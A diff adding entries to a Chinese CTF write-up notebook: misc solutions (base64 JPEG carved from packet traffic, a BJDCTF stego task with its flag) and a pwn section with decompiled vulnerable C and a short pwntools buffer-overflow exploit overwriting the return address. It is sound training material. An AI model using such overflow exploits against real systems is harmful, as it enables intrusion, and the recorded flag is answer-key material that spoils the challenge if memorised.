@@ -225,3 +225,67 @@ zip伪加密。ZipCenOp解压一下。
 重点：一定要在linux下, 否则缺少文件。 7z x filename
 
 解压出来。 key1 brainfuck, key2 ook 解码即可。
+
+### 数据包中的线索
+
+导出http对象(或追踪TCP流慢慢翻, 有个超长的奇怪)
+
+由开头”/9j/”，可知以下数据为jpg图片，“/9j/”经base64解码后结果为“\xff \xd8 \xff”，该三字节为jpg文件的开头三字节，所以可推断出以下文件为jpg文件。
+
+data:image/jpeg;base64,一长串，最后的换行后0不要。
+
+flag{209acebf6324a09671abc31c869de72c}
+
+### BJDCTF 2nd--EasyBaBa
+
+1、foremost命令分离jpg图片
+
+2、file命令或HxD查看文件类型，改后缀为.avi，用pr打开，一个4张二维码
+
+3、hex转ascii。
+
+## pwn
+
+
+```c
+int vuln()
+{
+  const char *v0; // eax
+  char s; // [esp+1Ch] [ebp-3Ch]
+  char v3; // [esp+3Ch] [ebp-1Ch]
+  char v4; // [esp+40h] [ebp-18h]
+  char v5; // [esp+47h] [ebp-11h]
+  char v6; // [esp+48h] [ebp-10h]
+  char v7; // [esp+4Fh] [ebp-9h]
+
+  printf("Tell me something about yourself: ");
+  fgets(&s, 32, edata); // 溢出, 0x3C到0, 再+4个eip
+  std::string::operator=(&input, &s);
+  std::allocator<char>::allocator(&v5);
+  std::string::string((int)&v4, (int)"you", (int)&v5);
+  std::allocator<char>::allocator(&v7);
+  std::string::string((int)&v6, (int)"I", (int)&v7); // I会改成you，所以除以0x3c除3=0x14=20
+  replace((std::string *)&v3);
+  std::string::operator=(&input, &v3, &v6, &v4);
+  std::string::~string((std::string *)&v3);
+  std::string::~string((std::string *)&v6);
+  std::allocator<char>::~allocator(&v7);
+  std::string::~string((std::string *)&v4);
+  std::allocator<char>::~allocator(&v5);
+  v0 = (const char *)std::string::c_str((std::string *)&input);
+  strcpy(&s, v0);
+  return printf("So, %s\n", &s);
+}
+```
+
+```python
+from pwn import *
+r = remote('node3.buuoj.cn',25394) 
+payload = 'a'*20+'b'*4+p32(0x08048F13).decode('latin')
+r.sendline(payload)
+r.interactive()
+```
+## 参考
+
+https://www.cnblogs.com/wrnan/p/12811009.html
+
